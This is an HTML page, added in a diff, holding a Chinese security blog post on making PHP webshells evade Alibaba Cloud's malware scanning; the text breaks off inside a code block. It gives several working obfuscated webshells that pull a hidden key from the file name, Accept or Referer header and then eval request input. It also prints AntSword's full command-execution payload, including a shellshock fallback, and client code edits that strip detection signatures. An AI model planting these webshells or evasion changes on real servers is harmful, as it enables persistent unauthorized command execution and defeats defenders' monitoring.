@@ -1,0 +1,187 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>webshell免杀过阿里云PHP | 藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="webshell免杀过阿里云PHP"/>
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>webshell免杀过阿里云PHP</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/08/webshell免杀过阿里云PHP/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-08T06:27:41.000Z">
+          2021-10-08
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    基于之前成功绕过JSP的免杀经验，主要对抗的重点还是放在分离免杀，在<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md" target="_blank" rel="noopener">这个</a>项目中也有一些关于RASP和沙箱对抗的经验，可以直接复用。</p>
+<h3 id="从文件名获取内容"><a href="#从文件名获取内容" class="headerlink" title="从文件名获取内容"></a>从文件名获取内容</h3><p>​    云查杀会将我们传入的文件重命名，因此我们可以利用真实的webshell和沙箱中的文件名不一致来绕过。</p>
+<a id="more"></a>
+
+<ul>
+<li>下面的程序会从文件名中取出r并使用</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$key = substr(<span class="keyword">__FILE__</span>,<span class="number">-5</span>,<span class="number">-4</span>);</span><br><span class="line">$&#123;<span class="string">"LandGrey"</span>&#125; =  $key.<span class="string">"Land!"</span>;</span><br><span class="line">$f = pack(<span class="string">"H*"</span>, <span class="string">"13"</span>.<span class="string">"3f120b1655"</span>) ^ $LandGrey;</span><br><span class="line">array_intersect_uassoc (<span class="keyword">array</span>($_REQUEST[$password] =&gt; <span class="string">""</span>), <span class="keyword">array</span>(<span class="number">1</span>), $f);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    由于我测试的PHP版本在7以上，不能使用assert，所以要稍微修改一下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>($a);</span><br><span class="line">    &#125;</span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$key = substr(<span class="keyword">__FILE__</span>,<span class="number">-5</span>,<span class="number">-4</span>);</span><br><span class="line">$&#123;<span class="string">"LandGrey"</span>&#125; =  $key.<span class="string">"Land!"</span>;</span><br><span class="line">$f = pack(<span class="string">"H*"</span>, <span class="string">"0629121a"</span>) ^ $LandGrey;</span><br><span class="line">array_intersect_uassoc (<span class="keyword">array</span>($_REQUEST[$password] =&gt; <span class="string">""</span>), <span class="keyword">array</span>(<span class="number">1</span>), $f);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    OK，经过测试，这样确实可以过阿里云的查杀，但是当执行命令后会爆一个进程异常行为，看起来是webshell连接工具的特征被标记了。</p>
+<p><img src="/2021/10/08/webshell%E5%85%8D%E6%9D%80%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91PHP/image-20211008164723424.png" alt="image-20211008164723424"></p>
+<p>​    从上面的截图中可以推测，主要是父进程执行的特征比较明显,所以可以尝试找到这部分的内容，看能否更改。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -c cd /var/www/html;ls;echo [S];pwd;echo [E]</span><br></pre></td></tr></table></figure>
+
+<p>​    首先我们一定很好奇，<code>为什么一定要加echo [S];pwd;echo [E]？</code>，我们可以抓一个命令执行的数据包分析一下。请求包中主要的代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span><span class="params">($out)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> @base64_encode($out);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $output = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"a34"</span>.</span><br><span class="line">    <span class="string">"be65"</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc($output);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"12f680"</span>.</span><br><span class="line">    <span class="string">"ecc486"</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $p = base64_decode(substr($_POST[<span class="string">"y09523d8d31747"</span>], <span class="number">2</span>));</span><br><span class="line">    $s = base64_decode(substr($_POST[<span class="string">"h5718ddf00b51b"</span>], <span class="number">2</span>));</span><br><span class="line">    $envstr = @base64_decode(substr($_POST[<span class="string">"l723784e81c292"</span>], <span class="number">2</span>));</span><br><span class="line">    $d = dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line">    $c = substr($d, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"/"</span> ? <span class="string">"-c \"&#123;$s&#125;\""</span> : <span class="string">"/c \"&#123;$s&#125;\""</span>;</span><br><span class="line">    <span class="keyword">if</span> (substr($d, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"/"</span>) &#123;</span><br><span class="line">        @putenv(<span class="string">"PATH="</span>.getenv(<span class="string">"PATH"</span>).</span><br><span class="line">            <span class="string">":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @putenv(<span class="string">"PATH="</span>.getenv(<span class="string">"PATH"</span>).</span><br><span class="line">            <span class="string">";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($envstr)) &#123;</span><br><span class="line">        $envarr = explode(<span class="string">"|||asline|||"</span>, $envstr);</span><br><span class="line">        <span class="keyword">foreach</span>($envarr <span class="keyword">as</span> $v) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>($v)) &#123;</span><br><span class="line">                @putenv(str_replace(<span class="string">"|||askey|||"</span>, <span class="string">"="</span>, $v));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $r = <span class="string">"&#123;$p&#125; &#123;$c&#125;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span><span class="params">($f)</span> </span>&#123;</span><br><span class="line">        $d = explode(<span class="string">","</span>, @ini_get(<span class="string">"disable_functions"</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($d)) &#123;</span><br><span class="line">            $d = <span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $d = array_map(<span class="string">'trim'</span>, array_map(<span class="string">'strtolower'</span>, $d));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (function_exists($f) &amp;&amp; is_callable($f) &amp;&amp; !in_array($f, $d));</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span><span class="params">($d, $c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($d, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"/"</span> &amp;&amp; fe(<span class="string">'putenv'</span>) &amp;&amp; (fe(<span class="string">'error_log'</span>) || fe(<span class="string">'mail'</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strstr(readlink(<span class="string">"/bin/sh"</span>), <span class="string">"bash"</span>) != <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">                $tmp = tempnam(sys_get_temp_dir(), <span class="string">'as'</span>);</span><br><span class="line">                putenv(<span class="string">"PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1"</span>);</span><br><span class="line">                <span class="keyword">if</span> (fe(<span class="string">'error_log'</span>)) &#123;</span><br><span class="line">                    error_log(<span class="string">"a"</span>, <span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    mail(<span class="string">"a@127.0.0.1"</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">"-bv"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $output = @file_get_contents($tmp);</span><br><span class="line">            @unlink($tmp);</span><br><span class="line">            <span class="keyword">if</span> ($output != <span class="string">""</span>) &#123;</span><br><span class="line">                <span class="keyword">print</span>($output);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span><span class="params">($c)</span> </span>&#123;</span><br><span class="line">        $ret = <span class="number">0</span>;</span><br><span class="line">        $d = dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line">        <span class="keyword">if</span> (fe(<span class="string">'system'</span>)) &#123;</span><br><span class="line">            @system($c, $ret);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(fe(<span class="string">'passthru'</span>)) &#123;</span><br><span class="line">            @passthru($c, $ret);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(fe(<span class="string">'shell_exec'</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@shell_exec($c));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(fe(<span class="string">'exec'</span>)) &#123;</span><br><span class="line">                @exec($c, $o, $ret);</span><br><span class="line">                <span class="keyword">print</span>(join(<span class="string">""</span>,$o));</span><br><span class="line">                            &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(fe(<span class="string">'popen'</span>))&#123;</span><br><span class="line">            $fp=@popen($c,<span class="string">'r'</span>);</span><br><span class="line">            <span class="keyword">while</span>(!@feof($fp))&#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets($fp,<span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @pclose($fp);&#125;</span><br><span class="line">            <span class="keyword">elseif</span>(fe(<span class="string">'proc_open'</span>))&#123;</span><br><span class="line">                $p = @proc_open($c, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">'pipe'</span>, <span class="string">'w'</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">'pipe'</span>, <span class="string">'w'</span>)), $io);</span><br><span class="line">                <span class="keyword">while</span>(!@feof($io[<span class="number">1</span>]))&#123;</span><br><span class="line">                    <span class="keyword">print</span>(@fgets($io[<span class="number">1</span>],<span class="number">2048</span>));</span><br><span class="line">                &#125;<span class="keyword">while</span>(!@feof($io[<span class="number">2</span>]))&#123;</span><br><span class="line">                    <span class="keyword">print</span>(@fgets($io[<span class="number">2</span>],<span class="number">2048</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                @fclose($io[<span class="number">1</span>]);</span><br><span class="line">                @fclose($io[<span class="number">2</span>]);</span><br><span class="line">                @proc_close($p);</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(fe(<span class="string">'antsystem'</span>))&#123;</span><br><span class="line">                @antsystem($c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span>(runshellshock($d, $c)) &#123;<span class="keyword">return</span> $ret;&#125;</span><br><span class="line">            <span class="keyword">elseif</span>(substr($d,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">" /"</span> &amp;&amp; @class_exists(<span class="string">"COM "</span>))&#123;</span><br><span class="line">            $w=<span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>);</span><br><span class="line">            $e=$w-&gt;exec($c);</span><br><span class="line">            $so=$e-&gt;StdOut();</span><br><span class="line">            $ret.=$so-&gt;ReadAll();</span><br><span class="line">            $se=$e-&gt;StdErr();</span><br><span class="line">            $ret.=$se-&gt;ReadAll();</span><br><span class="line">            <span class="keyword">print</span>($ret);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;$ret = <span class="number">127</span>;&#125;</span><br><span class="line">        <span class="keyword">return</span> $ret;&#125;;</span><br><span class="line">     $ret=@runcmd($r.<span class="string">"2 &gt; &amp; 1 "</span>);<span class="keyword">print</span> ($ret!=<span class="number">0</span>)?<span class="string">"</span></span><br><span class="line"><span class="string">                            ret = &#123;</span></span><br><span class="line"><span class="string">                                $ret</span></span><br><span class="line"><span class="string">                            &#125;</span></span><br><span class="line"><span class="string">                            "</span>:<span class="string">"</span></span><br><span class="line"><span class="string">                            "</span>;;&#125;<span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;<span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">                            ERROR: //"</span>.$e-&gt;getMessage();&#125;;asoutput();<span class="keyword">die</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    命令执行的逻辑主要在<code>runcmd</code>函数中，而<code>runcmd</code>的参数为<code>$r</code>，<code>$r</code>是由<code>&quot;{$p} {$c}&quot;;</code>组成，<code>$c</code>是从<code>$s</code>中提取的。</p>
+<p><img src="/2021/10/08/webshell%E5%85%8D%E6%9D%80%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91PHP/image-20211008174219308.png" alt="image-20211008174219308"></p>
+<p><code>$s</code>解码后内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &quot;&#x2F;var&#x2F;www&#x2F;html&quot;;ls;echo [S];pwd;echo [E]</span><br></pre></td></tr></table></figure>
+
+<p>我们对返回包内容解码，可以看到[S]和[E]中间为pwd的结果，蚁剑会提取这个结果并在客户端显示。</p>
+<p><img src="/2021/10/08/webshell%E5%85%8D%E6%9D%80%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91PHP/image-20211008174321473.png" alt="image-20211008174321473"></p>
+<p><img src="/2021/10/08/webshell%E5%85%8D%E6%9D%80%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91PHP/image-20211008174459642.png" alt="image-20211008174459642"></p>
+<p><code>[S]</code>和<code>[E]</code>其实也就是用来分割的作用，所以我们可以将其替换,但是替换成其他字符还是会被查杀。</p>
+<p><img src="/2021/10/08/webshell%E5%85%8D%E6%9D%80%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91PHP/image-20211008175245649.png" alt="image-20211008175245649"></p>
+<p>猜测是因为<code>[]</code>的问题，去掉了<code>[]</code>仍然会被杀，索性去掉<code>echo [A];pwd;echo [A]</code>这段内容，这样确实可以过，但是会影响shell的正常使用。之后我又做了如下测试。</p>
+<ul>
+<li>cd “/var/www/html”;ls;echo @;pwd;echo @; 杀</li>
+<li>cd “/var/www/html”;ls;echo @;pwd; 不杀</li>
+<li>cd “/var/www/html”;ls;pwd;  不杀</li>
+</ul>
+<p>通过上面的测试，只要在pwd前只使用一个echo就不会被杀，而一个echo也满足我们的使用需求了，下来我们要针对客户端简单的剔除特征。</p>
+<p>这部分的特征在<code>antSword\source\modules\terminal\index.js</code>文件中，代码如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 根据执行命令&amp;&amp;路径生成最终command</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param  <span class="type">&#123;String&#125;</span> </span>cmd  要执行的命令</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param  <span class="type">&#123;String&#125;</span> </span>path 当前路径</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return <span class="type">&#123;String&#125;</span>      </span>最终执行命令</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  parseCmd(cmd, path) &#123;</span><br><span class="line">    path = path</span><br><span class="line">      .replace(<span class="regexp">/\\\\/g</span>, <span class="string">'\\'</span>)</span><br><span class="line">      .replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">      .replace(<span class="regexp">/\\/g</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span>.isWin ?</span><br><span class="line">      <span class="keyword">this</span>.isPowershell ?</span><br><span class="line">      <span class="string">`cd "<span class="subst">$&#123;path&#125;</span>";<span class="subst">$&#123;cmd&#125;</span>;echo [S];(pwd).path;echo [E]`</span> :</span><br><span class="line">      <span class="string">`cd /d "<span class="subst">$&#123;path&#125;</span>"&amp;<span class="subst">$&#123;cmd&#125;</span>&amp;echo [S]&amp;cd&amp;echo [E]`</span> :</span><br><span class="line">      <span class="string">`cd "<span class="subst">$&#123;path&#125;</span>";<span class="subst">$&#123;cmd&#125;</span>;echo [S];pwd;echo [E]`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// 开始执行命令</span></span><br><span class="line">      <span class="keyword">this</span></span><br><span class="line">        .core</span><br><span class="line">        .request(<span class="keyword">this</span>.core.command.exec(&#123;</span><br><span class="line">          cmd: <span class="keyword">this</span>.parseCmd(cmd, <span class="keyword">this</span>.path),</span><br><span class="line">          bin: _bin,</span><br><span class="line">          env: <span class="built_in">Object</span>.keys(<span class="keyword">this</span>.asenvironmet).map(<span class="function">(<span class="params">k</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;k&#125;</span>|||askey|||<span class="subst">$&#123;<span class="keyword">this</span>.asenvironmet[k]&#125;</span>|||asline|||`</span>;</span><br><span class="line">          &#125;).join(<span class="string">''</span>),</span><br><span class="line">        &#125;))</span><br><span class="line">        .then(<span class="function">(<span class="params">ret</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">let</span> _ = antSword.unxss(ret[<span class="string">'text'</span>], <span class="literal">false</span>);</span><br><span class="line">          <span class="comment">// 解析出命令执行路径</span></span><br><span class="line">          <span class="keyword">const</span> indexS = _.lastIndexOf(<span class="string">'[S]'</span>);</span><br><span class="line">          <span class="keyword">const</span> indexE = _.lastIndexOf(<span class="string">'[E]'</span>);</span><br><span class="line">          <span class="keyword">let</span> _path = _.substr(indexS + <span class="number">3</span>, indexE - indexS - <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">let</span> output = _.replace(<span class="string">`[S]<span class="subst">$&#123;_path&#125;</span>[E]`</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure>
+
+<p>所以我们更改的主要有如下的部分，一个是发送命令的部分。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">parseCmd(cmd, path) &#123;</span><br><span class="line">  path = path</span><br><span class="line">    .replace(<span class="regexp">/\\\\/g</span>, <span class="string">'\\'</span>)</span><br><span class="line">    .replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">    .replace(<span class="regexp">/\\/g</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">this</span>.isWin ?</span><br><span class="line">    <span class="keyword">this</span>.isPowershell ?</span><br><span class="line">    <span class="string">`cd "<span class="subst">$&#123;path&#125;</span>";<span class="subst">$&#123;cmd&#125;</span>;echo [S];(pwd).path;`</span> :</span><br><span class="line">    <span class="string">`cd /d "<span class="subst">$&#123;path&#125;</span>"&amp;<span class="subst">$&#123;cmd&#125;</span>&amp;echo [S]&amp;cd;`</span> :</span><br><span class="line">    <span class="string">`cd "<span class="subst">$&#123;path&#125;</span>";<span class="subst">$&#123;cmd&#125;</span>;echo [S];pwd;`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还有就是返回结果解析的部分。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解析出命令执行路径</span></span><br><span class="line"><span class="keyword">const</span> indexS = _.lastIndexOf(<span class="string">'[S]'</span>);</span><br><span class="line"><span class="comment">// const indexE = _.lastIndexOf('[E]');</span></span><br><span class="line"><span class="keyword">let</span> _path = _.substr(indexS + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> output = _.replace(<span class="string">`[S]<span class="subst">$&#123;_path&#125;</span>`</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="从请求头获取执行内容"><a href="#从请求头获取执行内容" class="headerlink" title="从请求头获取执行内容"></a>从请求头获取执行内容</h3><p>​    和从文件名获取内容一样，不多赘述了，就是在使用时需要加上<code>Accpet:r</code>请求头。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>($a);</span><br><span class="line">    &#125;</span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$&#123;<span class="string">"LandGrey"</span>&#125; = $_SERVER[<span class="string">"HTTP_ACCEPT"</span>].<span class="string">"Land!"</span>;</span><br><span class="line">$f = pack(<span class="string">"H*"</span>, <span class="string">"0629121a"</span>) ^ $LandGrey;</span><br><span class="line">array_intersect_uassoc(<span class="keyword">array</span>($_REQUEST[$password] =&gt; <span class="string">""</span>), <span class="keyword">array</span>(<span class="number">1</span>), $f);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="从Referer中获取执行内容"><a href="#从Referer中获取执行内容" class="headerlink" title="从Referer中获取执行内容"></a>从Referer中获取执行内容</h3><p>​    使用需要传入<code>Referer: teste6123</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>($a);</span><br><span class="line">    &#125;</span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$wx = substr($_SERVER[<span class="string">"HTTP_REFERER"</span>],<span class="number">-6</span>,<span class="number">-4</span>);</span><br><span class="line"><span class="keyword">echo</span> $wx;</span><br><span class="line">forward_static_call_array($wx.<span class="string">"st"</span>, <span class="keyword">array</span>($_REQUEST[$password]));</span><br><span class="line"><span 